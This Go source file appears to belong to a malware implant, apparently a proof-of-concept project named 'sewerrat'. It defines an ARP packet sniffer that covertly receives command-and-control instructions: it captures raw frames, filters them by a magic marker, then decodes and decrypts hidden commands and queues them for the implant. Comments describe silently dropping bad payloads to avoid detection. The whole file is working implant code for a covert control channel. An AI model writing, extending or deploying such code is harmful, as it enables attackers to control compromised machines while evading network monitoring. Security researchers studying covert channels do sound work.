package implant

import (
	"fmt"
	"log"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"sewerrat/shared"
)

// ARPSniffer handles incoming ARP traffic and filters for C2 commands
type ARPSniffer struct {
	iface     *InterfaceInfo
	handle    *pcap.Handle
	commandCh chan string
}

// NewARPSniffer creates a new ARP sniffer instance
func NewARPSniffer(iface *InterfaceInfo) (*ARPSniffer, error) {
	handle, err := iface.GetDeviceHandle()
	if err != nil {
		return nil, err
	}

	return &ARPSniffer{
		iface:     iface,
		handle:    handle,
		commandCh: make(chan string, 10),
	}, nil
}

// Start begins sniffing ARP packets in a blocking loop
func (as *ARPSniffer) Start() error {
	if as.handle == nil {
		return fmt.Errorf("device not open")
	}

	packetSource := gopacket.NewPacketSource(as.handle, as.handle.LinkType())
	packetSource.NoCopy = true

	for packet := range packetSource.Packets() {
		// Extract and process the packet
		as.processPacket(packet)
	}

	return nil
}

// StartAsync starts sniffing in a separate goroutine
func (as *ARPSniffer) StartAsync() error {
	go func() {
		if err := as.Start(); err != nil {
			log.Printf("[!] Sniffer error: %v\n", err)
		}
	}()
	return nil
}

// GetCommandChannel returns the channel for receiving decoded commands
func (as *ARPSniffer) GetCommandChannel() <-chan string {
	return as.commandCh
}

// processPacket checks if packet contains C2 traffic and extracts command
func (as *ARPSniffer) processPacket(packet gopacket.Packet) {
	// Get the raw frame data
	frameData := packet.Data()

	// Validate frame size and check magic marker
	if !shared.ValidateMagicMarker(frameData) {
		return // Not our traffic, skip silently
	}

	// Decode the payload
	command, err := shared.PayloadDecode(frameData, false)
	if err != nil {
		// Silently ignore invalid payloads to avoid detection
		return
	}

	// Skip empty commands
	if command == "" {
		return
	}

	// Attempt decryption if enabled
	decrypted, err := shared.SafeDecrypt([]byte(command))
	if err != nil {
		// If decryption fails, try using as-is for PoC
		decrypted = []byte(command)
	}

	decodedCommand := string(decrypted)

	// Non-blocking send to command channel
	select {
	case as.commandCh <- decodedCommand:
		// Command queued successfully
	default:
		// Channel full, drop oldest (shouldn't happen in normal operation)
		log.Printf("[!] Command channel overflow, dropping: %s\n", decodedCommand)
	}
}

// Stop gracefully closes the sniffer
func (as *ARPSniffer) Stop() error {
	if as.handle != nil {
		as.handle.Close()
	}
	close(as.commandCh)
	return nil
}
